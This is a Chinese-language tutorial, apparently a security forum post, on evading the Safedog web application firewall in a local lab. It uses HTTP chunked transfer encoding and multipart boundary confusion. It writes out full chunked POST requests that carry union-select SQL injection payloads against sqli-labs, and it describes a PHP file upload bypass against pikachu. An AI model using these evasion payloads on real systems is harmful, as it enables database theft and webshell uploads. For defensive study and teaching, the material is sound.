0x01 前言
=======

某狗可谓是比较好绕过的waf，但是随着现在的发展，某狗也是越来越难绕过了，但是也不是毫无办法，争取这篇文章给正在学习waf绕过的小白来入门一种另类的waf绕过。

```php
某狗可谓是比较好绕过的waf，但是随着现在的发展，某狗也是越来越难绕过了，但是也不是毫无办法，争取这篇文章给正在学习waf绕过的小白来入门一种另类的waf绕过。
```

环境的搭建：
------

环境的搭建就选择phpstudy2018+安全狗最新版(2022年10月23日前)

```php
Tip：
  （1）记得先在phpstudy的Apache的bin目录下初始化Apache服务，一般来说，第一次为询问是否确认，第二次为确认安装（命令：httpd.exe -k install -n apache2.4  用管理员打开）
  （2）上传防护中把完整的post包过滤勾选上。
```

0x02 HTTP补充：
============

分块传输的介绍：
--------

分块传输编码是超文本传输协议（HTTP）中的一种数据传输机制，允许HTTP由应用服务器向客户端发送的数据分成多个部分，在消息头中指定 Transfer-Encoding: chunked 就表示整个response将使分块传输编译来传输内容。一个消息块由n块组成，并在最后一个大小为0的块结束。  
![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-657cf4fc25d8212def8f2b825ccf75785e4e5200.png)

### 请求头Transfer-encoding：

官方文档:

```php
告知接收方为了可靠地传输报文，已经对其进行了何种编码。
```

chunked编码，使用若干个chunk串连接而成，由一个标明长度为0的chunk表示解释，每个chunk分为头部和正文两部分，头部内容定义了下一行传输内容的个数（个数用16进制来进行表示）和数量（一般不写数量，但是为了混淆，这里还是把数量写上去）正文部分就是指定长度的实际内容。两部分之间用(CRLF)来隔开，在最后一个长度为0的chunk中表示结束。**并且长度中是以;作为长度的结束**

```php
数据包中添加：Transfer-Encoding: chunked
数字代表下一行的字符所占位数，最后需要用0独占一行表示结束，结尾需要两个回车
```

当设置这个Transfer-Encoding请求头的时候，会有两个效果：

```php
Content-length字段自动忽略
基于长久化持续推送动态内容（不太了解，但是第三感觉有研究内容）
```

![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-773576a686f9e155a2a50b7958971864df8f0bfa.png)

### HTTP持久化连接：

因为现在大多数是http1.1协议版本，所以的话，只在Transfer-Encoding中定义了chunked一种编码格式。

```php
持久化连接：
  Http请求是运行在TCP连接上的，所以自然有TCP的三次握手和四次挥手，慢启动的问题，所以为了提高http的性能，就使用了持久化连接。持久化连接在《计算机网络》中有提及。

  在Http1.1的版本中规定了所有连接默认都是持久化连接，除非在请求头上加上Connection：close。来关闭持久化连接。
```

### Content-Type介绍：

Content-Type：互联网媒体类型， 也叫MIME类型，在HTTP的协议消息头中，使用Content-Type来表示请求和响应中的媒体数据格式标签，用于区分数据类型。  
常见Content-Type的格式如下：

```php
Content-Type: text/html;
Content-Type: application/json;charset:utf-8;
Content-Type：type/subtype ;parameter
Content-Type：application/x-www-form-urlencoded
Content-Type：multipart/form-data
```

重点介绍multipart/form-data：  
当服务器使用multipart/form-data接收POST请求的时候，服务器如何知道开始位置和结束位置的呢？？？  
其中就是用了boundary边界来进行操作的。  
![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-766c71ee5ae554fa942597fdebfe50e1e4fbc9ab.png)

waf绕过的思路：
=========

正常传输的payload都是可以被waf的正则匹配到的，而进行分块传输之后的payload，waf的正则不会进行匹配，而又满足http的规则，所以就能绕过waf。  
![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-399e8ea44e160a117536c77c868626d9e9a8ce85.png)![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-30f28c141c88423b0d729ce31421ab563f38a45d.png)

#### 例如：

正常传输过程中是这样的。  
![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-3afbe376613e7eee243230eebfa3e8b42006bd96.png)那么分块传输之后，就变成了这样。

```php
POST /sqli-labs-master/Less-11/ HTTP/1.1
Host: 192.168.172.161
Content-Length: 128
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.172.161
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.172.161/sqli-labs-master/Less-11/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Transfer-Encoding: chunked

4
unam
1
e
1
=
4
admi
1
n
1
&
4
pass
2
wd
1
=
4
admi
1
n
1
&
4
subm
2
it
1
=
4
Subm
2
it
0

```

![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-80590f978f9764647c5dd3aafaa2379bbf7a6efa.png)

说明是可以识别分块传输的东西，那么我们就可以构造payload来看是否可以绕过waf。

绕过安全狗的sql注入：
============

这里先解决一下绕过安全狗的方式，在常见的方式中，我们都采用垃圾字符填充的方式来绕过安全狗，虽然效果很好，但是较为复杂，也容易出现被狗咬伤的情况，所以为了解决这一现状，小秦同学翻阅之后发现了分块传输的方式来绕过安全狗。但是分块传输目前来看只能适用于post请求。get请求还是比较难说。

### 以sql-labs为例：

在sqli-labs的第十一关，我们发现了可以用post请求。先正常看看过滤哪些字符，这里开门见山，直接把'union select (database()),2#。这个东西进行了过滤  
![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-7114da65711595b0780c0740326f813194bc1b53.png)  
咱们可以尝试使用分块传输的方式来进行绕过。这里在请求头中添加。

```php
Transfer-Encoding: chunked
这个东西，然后进行分块即可。
```

#### 读取数据库名

```php
POST /sqli-labs-master/Less-11/ HTTP/1.1
Host: 192.168.172.161
Content-Length: 251
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.172.161
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.172.161/sqli-labs-master/Less-11/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Transfer-Encoding: chunked

1
u
4
name
1
=
1
&
2
pa
4
sswd
1
=
3
%27
2
un
1
i
2
on
1
+
2
se
1
l
2
ec
1
t
1
+
3
%28
2
da
1
t
2
ab
1
a
2
se
3
%28
3
%29
3
%29
3
%2C
1
2
3
%23
1
&
3
sub
3
mit
1
=
3
Sub
3
mit
0

```

![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-b0040031d9ff8193c52ccf29610de6d119661a77.png)

#### 读取表名：

```php
POST /sqli-labs-master/Less-11/ HTTP/1.1
Host: 192.168.172.161
Content-Length: 619
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.172.161
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.172.161/sqli-labs-master/Less-11/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Transfer-Encoding: chunked

1
u
2
na
1
m
1
e
1
=
1
&
2
pa
2
ss
2
wd
1
=
3
%27
1
u
2
ni
1
o
1
n
1
+
2
se
2
le
1
c
1
t
1
+
3
%28
2
se
1
l
1
e
2
ct
1
+
2
gr
2
ou
1
p
1
_
2
co
2
nc
2
at
3
%28
2
ta
2
bl
1
e
1
_
2
na
2
me
3
%29
1
+
2
fr
2
om
1
+
2
in
2
fo
1
r
3
mat
2
io
1
n
1
_
2
sc
3
hem
1
a
1
.
2
ta
2
bl
2
es
1
+
2
wh
2
er
1
e
1
+
2
ta
2
bl
1
e
1
_
2
sc
2
he
1
m
1
a
3
%3D
2
da
1
t
2
ab
3
ase
3
%28
3
%29
3
%29
3
%2C
1
2
3
%23
1
&
2
su
3
bmi
1
t
1
=
2
Su
4
bmit
0

```

![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-bc9708d3d40f2fbffbe056e6178446a20e591a2f.png)

#### 读列名：

![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-032cc48054e2dcb659e0ea84c204527ea3b7acb3.png)

#### 读取数据：

![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-d9b88084f62e45cd38207caac07d610b7b577ff3.png)

绕过安全狗的文件上传（以pikachu靶场为例
=======================

这里上面讲到了分块传输，这里直接先使用分块传输来进行绕过。这里讲下计算方式，因为文件上传不像sql注入那样单行，所以文件上传是会有回车和空格的计算，（一个回车和一个空格占两个字符）。例如下图：  
![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-d9b88084f62e45cd38207caac07d610b7b577ff3.png)  
红框中的部分，分别处于不同的行，所以需要传入回车，所以这部分就应该是：  
![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-615d641920757c5edb26fc22e51ee3729fdbbc36.png)  
这块先去上传php文件为例，可以进行分块传输的构造。然后上传。  
![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-85ccadc87659e95f985a0fb4a81079ee84864eef.png)  
发现单单的分块传输已经不能绕过安全狗文件上传的检测了。  
![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-924efb3c599006197b20a65a7b7a0ce779cca2e1.png)

Content-Type中的boundary边界混淆绕过
----------------------------

因为上面讲到了Content-Type类型，那么对于我们来说，文件上传一定是利用了Content-Type中的multipart/form-data来进行的文件上传操作，刚才讲到了利用multipart/form-data必须用boundary边界来进行限制，那么我们这里研究一下boundary边界的一些问题。

### 深入研究boundary边界问题：

![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-beeda572d17d65e3089496e930b52d638a89f927.png)这里拿上面的边界来做文章，这里看到了，当上面定义了boundary=----WFJAFAOKAJNFKLAJ的时候我想到了两个问题。

```php
1.如果有两个boundary是取前一个还是后一个？
2.boundary结束标志必须和定义的一定相同嘛？

下面继续一一测试

```

#### boundary边界问题fuzz：

##### boundary边界一致：

![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-8ee3edb96bced7c42235caf09f5289683aa48bbd.png)

##### boundary结束标志不一致：

![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-985f76fbba07c752173704b783dfbd29898f3895.png)

##### boundary开始标志不一致：

![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-ffe91b2439f69468cc4199574b4b57ac62614869.png)  
上面经过研究可以发现boundary结束标志不影响判断。

### 多个boundary：

![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-dc7a8b70113e61d26ef1dde4b3bff4ef8498687d.png)  
![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-f56504ef10d7f211ecf2bb2e4aebb5cf1ef276cb.png)

所以当定义两个boundary的时候，只有第一个起作用。经过了上面的测试发现，我们可以通过构造多个boundary和修改boundary结束标志来达到混淆的效果，这里进行测试。

##### 多个boundary混淆：

![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-efe04b79be0564b29c166cc009be9301ddae1306.png)这里进入uploads/1.php查看

![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-16d076aecc158ad105c72282156dc57a49ff0cce.png)  
成功绕过waf。

##### 发现：

这里发现，其他不用非得加boundary混淆，测到boundary后面加分号就直接可以绕过安全狗来上传成功。  
![在这里插入图片描述](https://shs3.b.qianxin.com/attack_forum/2022/10/attach-dfdfcee2e039c8bca59e4edac2bfceba9503cfa2.png)

### 对于分块传输的小Tip：

```php
(1)分块传输的每个长度以;结尾，所以可以构造1;fjaojafjao这种来干扰waf
(2)分块传输的时候是不会管Content-Length的长度，所以可以通过Content-Length的长度变换来绕过某些waf
(3)分块传输只是适用于post请求，这也是存在的弊端问题
```

总结：
===

绕过waf的方式多种多样，但是越简单的方式越需要底层的探索，所以底层的学习是非常必要的。希望给正在学习绕waf的小伙伴提供一些思路。而不仅限于垃圾字符填充。

参考文献：
=====

```php
https://zhuanlan.zhihu.com/p/465948117
http://t.zoukankan.com/liujizhou-p-11802189.html
https://copyfuture.com/blogs-details/202203261638435585
```